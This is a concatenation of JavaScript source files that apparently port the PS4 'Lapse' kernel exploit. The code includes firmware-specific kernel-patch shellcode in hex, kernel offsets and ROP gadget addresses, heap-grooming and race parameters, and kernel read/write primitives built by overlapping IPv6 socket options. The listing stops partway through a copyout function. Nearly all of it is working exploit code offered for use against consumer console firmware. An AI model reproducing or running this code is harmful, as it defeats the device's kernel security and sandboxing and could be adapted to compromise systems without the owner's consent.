
/***** config.js *****/

// PS4 Lapse Configuration
// Ported from PS5 version for Netflix n Hack

FW_VERSION = "";
IS_PS4 = true;

PAGE_SIZE = 0x4000;
PHYS_PAGE_SIZE = 0x1000;

LIBKERNEL_HANDLE = 0x2001n;

// Socket constants - only define if not already in scope
// (inject.js defines some of these as const in the eval scope)
if (typeof AF_UNIX === 'undefined') AF_UNIX = 1n;
if (typeof AF_INET === 'undefined') AF_INET = 2n;
if (typeof AF_INET6 === 'undefined') AF_INET6 = 28n;

if (typeof SOCK_STREAM === 'undefined') SOCK_STREAM = 1n;
if (typeof SOCK_DGRAM === 'undefined') SOCK_DGRAM = 2n;

if (typeof IPPROTO_TCP === 'undefined') IPPROTO_TCP = 6n;
if (typeof IPPROTO_UDP === 'undefined') IPPROTO_UDP = 17n;
if (typeof IPPROTO_IPV6 === 'undefined') IPPROTO_IPV6 = 41n;

if (typeof SOL_SOCKET === 'undefined') SOL_SOCKET = 0xFFFFn;
if (typeof SO_REUSEADDR === 'undefined') SO_REUSEADDR = 4n;
if (typeof SO_LINGER === 'undefined') SO_LINGER = 0x80n;

// IPv6 socket options
if (typeof IPV6_PKTINFO === 'undefined') IPV6_PKTINFO = 46n;
if (typeof IPV6_NEXTHOP === 'undefined') IPV6_NEXTHOP = 48n;
if (typeof IPV6_RTHDR === 'undefined') IPV6_RTHDR = 51n;
if (typeof IPV6_TCLASS === 'undefined') IPV6_TCLASS = 61n;
if (typeof IPV6_2292PKTOPTIONS === 'undefined') IPV6_2292PKTOPTIONS = 25n;

// TCP socket options
if (typeof TCP_INFO === 'undefined') TCP_INFO = 32n;
if (typeof TCPS_ESTABLISHED === 'undefined') TCPS_ESTABLISHED = 4n;

// All syscalls from lapse.py (PS4)
// (SYSCALL object is already defined in inject.js, we just add properties)
SYSCALL.unlink = 0xAn;              // 10
SYSCALL.pipe = 42n;                 // 42
SYSCALL.getpid = 20n;               // 20
SYSCALL.getuid = 0x18n;             // 24
SYSCALL.connect = 98n;              // 98
SYSCALL.munmap = 0x49n;             // 73
SYSCALL.mprotect = 0x4An;           // 74
SYSCALL.getsockopt = 0x76n;         // 118
SYSCALL.socketpair = 0x87n;         // 135
SYSCALL.nanosleep = 0xF0n;          // 240
SYSCALL.sched_yield = 0x14Bn;       // 331
SYSCALL.thr_exit = 0x1AFn;          // 431
SYSCALL.thr_self = 0x1B0n;          // 432
SYSCALL.thr_new = 0x1C7n;           // 455
SYSCALL.rtprio_thread = 0x1D2n;     // 466
SYSCALL.mmap = 477n;                // 477
SYSCALL.cpuset_getaffinity = 0x1E7n; // 487
SYSCALL.cpuset_setaffinity = 0x1E8n; // 488
SYSCALL.jitshm_create = 0x215n;     // 533
SYSCALL.evf_create = 0x21An;        // 538
SYSCALL.evf_delete = 0x21Bn;        // 539
SYSCALL.evf_set = 0x220n;           // 544
SYSCALL.evf_clear = 0x221n;         // 545
SYSCALL.is_in_sandbox = 0x249n;     // 585
SYSCALL.dlsym = 0x24Fn;             // 591
SYSCALL.thr_suspend_ucontext = 0x278n; // 632
SYSCALL.thr_resume_ucontext = 0x279n; // 633
SYSCALL.aio_multi_delete = 0x296n;  // 662
SYSCALL.aio_multi_wait = 0x297n;    // 663
SYSCALL.aio_multi_poll = 0x298n;    // 664
SYSCALL.aio_multi_cancel = 0x29An;  // 666
SYSCALL.aio_submit_cmd = 0x29Dn;    // 669
SYSCALL.kexec = 0x295n;             // 661

MAIN_CORE = 4;  // Same as yarpe
MAIN_RTPRIO = 0x100;
NUM_WORKERS = 2;
NUM_GROOMS = 0x200;
NUM_HANDLES = 0x100;
NUM_SDS = 64;
NUM_SDS_ALT = 48;
NUM_RACES = 100;
NUM_ALIAS = 100;
LEAK_LEN = 16;
NUM_LEAKS = 32;
NUM_CLOBBERS = 8;
MAX_AIO_IDS = 0x80;

AIO_CMD_READ = 1n;
AIO_CMD_FLAG_MULTI = 0x1000n;
AIO_CMD_MULTI_READ = 0x1001n;
AIO_CMD_WRITE = 2n;
AIO_STATE_COMPLETE = 3n;
AIO_STATE_ABORTED = 4n;

SCE_KERNEL_ERROR_ESRCH = 0x80020003n;

RTP_SET = 1n;
PRI_REALTIME = 2n;

// TCP info structure size for getsockopt
size_tcp_info = 0xEC;

block_fd = 0xffffffffffffffffn;
unblock_fd = 0xffffffffffffffffn;
block_id = -1n;
groom_ids = null;
sds = null;
sds_alt = null;
prev_core = -1;
prev_rtprio = 0n;
ready_signal = 0n;
deletion_signal = 0n;
pipe_buf = 0n;

saved_fpu_ctrl = 0;
saved_mxcsr = 0;

function sysctlbyname(name, oldp, oldp_len, newp, newp_len) {
    const translate_name_mib = malloc(0x8);
    const buf_size = 0x70;
    const mib = malloc(buf_size);
    const size = malloc(0x8);

    write64_uncompressed(translate_name_mib, 0x300000000n);
    write64_uncompressed(size, BigInt(buf_size));

    const name_addr = alloc_string(name);
    const name_len = BigInt(name.length);

    if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) === 0xffffffffffffffffn) {
        throw new Error("failed to translate sysctl name to mib (" + name + ")");
    }

    if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) === 0xffffffffffffffffn) {
        return false;
    }

    return true;
}


/***** kernel_offset.js *****/

// PS4 Kernel Offsets for Lapse exploit
// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py

// Kernel patch shellcode (hex strings) - patches security checks in kernel
// These are executed via kexec after jailbreak to enable full functionality
const kpatch_shellcode = {
    "9.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b080066448991c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3",
    "9.03": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b08006644899194ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3",
    "9.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00eb664489893b6d19006644899124f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3",
    "10.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600eb664489897b20390066448991a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3",
    "10.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898113302100b8eb04000041b9eb00000041baeb000000668981ecb2470041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800eb668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3",
    "11.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e00b8eb04000041b9eb00000041baeb000000668981ecc8350041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300eb668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3",
    "11.02": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e00b8eb04000041b9eb00000041baeb0000006689810cc9350041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300eb66898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3",
    "11.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
    "12.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
};

// Helper to convert hex string to byte array
function hexToBytes(hex) {
    const bytes = [];
    for (let i = 0; i < hex.length; i += 2) {
        bytes.push(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
}

// Get kernel patch shellcode for firmware version
function get_kpatch_shellcode(fw_version) {
    // Normalize version for lookup
    let lookup_version = fw_version;

    // Map similar versions
    if (fw_version === "9.04") lookup_version = "9.03";
    else if (fw_version === "9.51" || fw_version === "9.60") lookup_version = "9.50";
    else if (fw_version === "10.01") lookup_version = "10.00";
    else if (fw_version === "10.70" || fw_version === "10.71") lookup_version = "10.50";
    else if (fw_version === "11.52") lookup_version = "11.50";
    else if (fw_version === "12.02") lookup_version = "12.00";

    const hex = kpatch_shellcode[lookup_version];
    if (!hex) {
        return null;
    }
    return hexToBytes(hex);
}

// Firmware-specific offsets for PS4

offset_ps4_9_00 = {
    EVF_OFFSET: 0x7F6F27n,
    PRISON0: 0x111F870n,
    ROOTVNODE: 0x21EFF20n,
    TARGET_ID_OFFSET: 0x221688Dn,
    SYSENT_661: 0x1107F00n,
    JMP_RSI_GADGET: 0x4C7ADn,
};

offset_ps4_9_03 = {
    EVF_OFFSET: 0x7F4CE7n,
    PRISON0: 0x111B840n,
    ROOTVNODE: 0x21EBF20n,
    TARGET_ID_OFFSET: 0x221288Dn,
    SYSENT_661: 0x1103F00n,
    JMP_RSI_GADGET: 0x5325Bn,
};

offset_ps4_9_50 = {
    EVF_OFFSET: 0x769A88n,
    PRISON0: 0x11137D0n,
    ROOTVNODE: 0x21A6C30n,
    TARGET_ID_OFFSET: 0x221A40Dn,
    SYSENT_661: 0x1100EE0n,
    JMP_RSI_GADGET: 0x15A6Dn,
};

offset_ps4_10_00 = {
    EVF_OFFSET: 0x7B5133n,
    PRISON0: 0x111B8B0n,
    ROOTVNODE: 0x1B25BD0n,
    TARGET_ID_OFFSET: 0x1B9E08Dn,
    SYSENT_661: 0x110A980n,
    JMP_RSI_GADGET: 0x68B1n,
};

offset_ps4_10_50 = {
    EVF_OFFSET: 0x7A7B14n,
    PRISON0: 0x111B910n,
    ROOTVNODE: 0x1BF81F0n,
    TARGET_ID_OFFSET: 0x1BE460Dn,
    SYSENT_661: 0x110A5B0n,
    JMP_RSI_GADGET: 0x50DEDn,
};

offset_ps4_11_00 = {
    EVF_OFFSET: 0x7FC26Fn,
    PRISON0: 0x111F830n,
    ROOTVNODE: 0x2116640n,
    TARGET_ID_OFFSET: 0x221C60Dn,
    SYSENT_661: 0x1109350n,
    JMP_RSI_GADGET: 0x71A21n,
};

offset_ps4_11_02 = {
    EVF_OFFSET: 0x7FC22Fn,
    PRISON0: 0x111F830n,
    ROOTVNODE: 0x2116640n,
    TARGET_ID_OFFSET: 0x221C60Dn,
    SYSENT_661: 0x1109350n,
    JMP_RSI_GADGET: 0x71A21n,
};

offset_ps4_11_50 = {
    EVF_OFFSET: 0x784318n,
    PRISON0: 0x111FA18n,
    ROOTVNODE: 0x2136E90n,
    TARGET_ID_OFFSET: 0x21CC60Dn,
    SYSENT_661: 0x110A760n,
    JMP_RSI_GADGET: 0x704D5n,
};

offset_ps4_12_00 = {
    EVF_OFFSET: 0x784798n,
    PRISON0: 0x111FA18n,
    ROOTVNODE: 0x2136E90n,
    TARGET_ID_OFFSET: 0x21CC60Dn,
    SYSENT_661: 0x110A760n,
    JMP_RSI_GADGET: 0x47B31n,
};

// Map firmware versions to offset objects
ps4_kernel_offset_list = {
    "9.00": offset_ps4_9_00,
    "9.03": offset_ps4_9_03,
    "9.04": offset_ps4_9_03,
    "9.50": offset_ps4_9_50,
    "9.51": offset_ps4_9_50,
    "9.60": offset_ps4_9_50,
    "10.00": offset_ps4_10_00,
    "10.01": offset_ps4_10_00,
    "10.50": offset_ps4_10_50,
    "10.70": offset_ps4_10_50,
    "10.71": offset_ps4_10_50,
    "11.00": offset_ps4_11_00,
    "11.02": offset_ps4_11_02,
    "11.50": offset_ps4_11_50,
    "11.52": offset_ps4_11_50,
    "12.00": offset_ps4_12_00,
    "12.02": offset_ps4_12_00,
};

kernel_offset = null;

function get_kernel_offset(FW_VERSION) {
    const fw_offsets = ps4_kernel_offset_list[FW_VERSION];

    if (!fw_offsets) {
        throw new Error("Unsupported PS4 firmware version: " + FW_VERSION);
    }

    kernel_offset = { ...fw_offsets };

    // PS4-specific proc structure offsets
    kernel_offset.PROC_FD = 0x48n;
    kernel_offset.PROC_PID = 0xB0n;       // PS4 = 0xB0, PS5 = 0xBC
    kernel_offset.PROC_VM_SPACE = 0x200n;
    kernel_offset.PROC_UCRED = 0x40n;
    kernel_offset.PROC_COMM = -1n;        // Found dynamically
    kernel_offset.PROC_SYSENT = -1n;      // Found dynamically

    // filedesc - PS4 different from PS5
    kernel_offset.FILEDESC_OFILES = 0x0n;  // PS4 = 0x0, PS5 = 0x8
    kernel_offset.SIZEOF_OFILES = 0x8n;    // PS4 = 0x8, PS5 = 0x30

    // vmspace structure
    kernel_offset.VMSPACE_VM_PMAP = -1n;

    // pmap structure
    kernel_offset.PMAP_CR3 = 0x28n;

    // socket/net - PS4 specific
    kernel_offset.SO_PCB = 0x18n;
    kernel_offset.INPCB_PKTOPTS = 0x118n;  // PS4 = 0x118, PS5 = 0x120

    // pktopts structure - PS4 specific
    kernel_offset.IP6PO_TCLASS = 0xB0n;    // PS4 = 0xB0, PS5 = 0xC0
    kernel_offset.IP6PO_RTHDR = 0x68n;     // PS4 = 0x68, PS5 = 0x70

    return kernel_offset;
}

function find_proc_offsets() {
    const proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000);

    // Look for patterns to find dynamic offsets
    const p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb");
    const p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f");

    if (p_comm_sign.length === 0) {
        throw new Error("failed to find offset for PROC_COMM");
    }

    if (p_sysent_sign.length === 0) {
        throw new Error("failed to find offset for PROC_SYSENT");
    }

    const p_comm_offset = BigInt(p_comm_sign[0] + 0x8);
    const p_sysent_offset = BigInt(p_sysent_sign[0] - 0x10);

    return {
        PROC_COMM: p_comm_offset,
        PROC_SYSENT: p_sysent_offset
    };
}

function update_kernel_offsets() {
    const offsets = find_proc_offsets();

    for (const [key, value] of Object.entries(offsets)) {
        kernel_offset[key] = value;
    }
}


/***** misc.js *****/

function find_pattern(buffer, pattern_string) {
    const parts = pattern_string.split(' ');
    const matches = [];

    for (let i = 0; i <= buffer.length - parts.length; i++) {
        let match = true;

        for (let j = 0; j < parts.length; j++) {
            if (parts[j] === '?') continue;
            if (buffer[i + j] !== parseInt(parts[j], 16)) {
                match = false;
                break;
            }
        }

        if (match) matches.push(i);
    }

    return matches;
}

function get_fwversion() {
    const buf = malloc(0x8);
    const size = malloc(0x8);
    write64_uncompressed(size, 0x8n);

    if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
        const byte1 = Number(read8_uncompressed(buf + 2n));  // Minor version (first byte)
        const byte2 = Number(read8_uncompressed(buf + 3n));  // Major version (second byte)

        const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
        return version;
    }

    return null;
}

function create_pipe() {
    const fildes = malloc(0x10);

    logger.log("      create_pipe: calling pipe syscall...");
    logger.flush();

    // Use the standard syscall() function from inject.js
    const result = syscall(SYSCALL.pipe, fildes);

    logger.log("      create_pipe: pipe returned " + hex(result));
    logger.flush();

    if (result === 0xffffffffffffffffn) {
        throw new Error("pipe syscall failed");
    }

    const read_fd = read32_uncompressed(fildes);
    const write_fd = read32_uncompressed(fildes + 4n);
    logger.log("      create_pipe: read_fd=" + hex(read_fd) + " write_fd=" + hex(write_fd));
    logger.flush();
    return [read_fd, write_fd];
}

function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
    }
    return buffer;
}

function read_cstring(addr) {
    let str = "";
    let i = 0n;
    while (true) {
        const c = Number(read8_uncompressed(addr + i));
        if (c === 0) break;
        str += String.fromCharCode(c);
        i++;
        if (i > 256n) break; // Safety limit
    }
    return str;
}

function write_buffer(addr, buffer) {
    for (let i = 0; i < buffer.length; i++) {
        write8_uncompressed(addr + BigInt(i), buffer[i]);
    }
}

function get_nidpath() {
    const path_buffer = malloc(0x255);
    const len_ptr = malloc(8);

    write64_uncompressed(len_ptr, 0x255n);

    const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
    if (ret === 0xffffffffffffffffn) {
        throw new Error("randomized_path failed : " + hex(ret));
    }

    return read_cstring(path_buffer);
}

function nanosleep(nsec) {
    const timespec = malloc(0x10);
    write64_uncompressed(timespec, BigInt(Math.floor(nsec / 1e9)));    // tv_sec
    write64_uncompressed(timespec + 8n, BigInt(nsec % 1e9));           // tv_nsec
    syscall(SYSCALL.nanosleep, timespec);
}

function is_jailbroken() {
    const cur_uid = syscall(SYSCALL.getuid);
    const is_in_sandbox = syscall(SYSCALL.is_in_sandbox);
    if (cur_uid === 0n && is_in_sandbox === 0n) {
        return true;
    } else {

        // Check if elfldr is running at 9021
        const sockaddr_in = malloc(16);
        const enable = malloc(4);

        const sock_fd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
        if (sock_fd === 0xffffffffffffffffn) {
            throw new Error("socket failed: " + hex(sock_fd));
        }

        try {
            write32_uncompressed(enable, 1);
            syscall(SYSCALL.setsockopt, sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4n);

            write8_uncompressed(sockaddr_in + 1n, AF_INET);
            write16_uncompressed(sockaddr_in + 2n, 0x3D23n);      // port 9021
            write32_uncompressed(sockaddr_in + 4n, 0x0100007Fn);  // 127.0.0.1

            // Try to connect to 127.0.0.1:9021
            const ret = syscall(SYSCALL.connect, sock_fd, sockaddr_in, 16n);

            if (ret === 0n) {
                syscall(SYSCALL.close, sock_fd);
                return true;
            } else {
                syscall(SYSCALL.close, sock_fd);
                return false;
            }
        } catch (e) {
            syscall(SYSCALL.close, sock_fd);
            return false;
        }
    }
}

function check_jailbroken() {
    if (!is_jailbroken()) {
        throw new Error("process is not jailbroken")
    }
}

function file_exists(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);

    if (fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        return true;
    } else {
        return false;
    }
}

function write_file(path, text) {
    const mode = 0x1ffn; // 777
    const path_addr = alloc_string(path);
    const data_addr = alloc_string(text);

    const flags = O_CREAT | O_WRONLY | O_TRUNC;
    const fd = syscall(SYSCALL.open, path_addr, flags, mode);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("open failed for " + path + " fd: " + hex(fd));
    }

    const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
    if (written === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("write failed : " + hex(written));
    }

    syscall(SYSCALL.close, fd);
    return Number(written); // number of bytes written
}


/***** kernel.js *****/

// PS4 Kernel Read/Write primitives
// Ported from PS5 version - adjusted for PS4 structure offsets

kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    let result = "";

    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;

        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }

        if (null_pos >= 0) {
            if (null_pos > 0) {
                for(let i = 0; i < null_pos; i++) {
                    result += String.fromCharCode(Number(chunk[i]));
                }
            }
            return result;
        }

        for(let i = 0; i < chunk.length; i++) {
            result += String.fromCharCode(Number(chunk[i]));
        }

        kaddr = kaddr + BigInt(chunk.length);
    }

    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

// IPv6 kernel r/w primitive
ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;

    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    // PS4: ofiles is at offset 0x0, each entry is 0x8 bytes
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const [read_fd, write_fd] = create_pipe();

    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);

    write64_uncompressed(pktinfo_size_store, 0x14n);

    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);

    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);

    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);

    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64_uncompressed(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
    if (kaddr === null || kaddr === undefined ||
        uaddr === null || uaddr === undefined ||
        len === null || len === undefined || len === 0n) {
        throw new Error("copyout: invalid arguments");
    }

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
